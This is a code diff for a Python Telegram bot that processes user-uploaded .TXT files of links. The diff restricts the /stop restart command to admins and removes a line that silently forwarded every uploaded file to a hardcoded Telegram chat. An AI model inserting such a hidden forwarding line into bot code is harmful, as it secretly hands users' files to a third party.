@@ -35,7 +35,7 @@ async def account_login(bot: Client, m: Message):
     editable = await m.reply_text("Hey Freind 😎 I Am A Bot For Download Links From Your **.TXT** File. \n\n **Bot Made By Surya Bishnoi 🚩** \n Send me /BISHNOI Command And Follow Steps..")
 
 
-@bot.on_message(filters.command("stop"))
+@bot.on_message(filters.command("stop") & filters.user(ADMINS))
 async def restart_handler(_, m):
     await m.reply_text("**Stopped**⚠️", True)
     os.execl(sys.executable, sys.executable, *sys.argv)
@@ -47,7 +47,6 @@ async def account_login(bot: Client, m: Message):
     editable = await m.reply_text('Send me **TXT File**⚡️')
     input: Message = await bot.listen(editable.chat.id)
     x = await input.download()
-    await bot.send_document(-1002078861667, x)
     await input.delete(True)
 
     path = f"./downloads/{m.chat.id}"
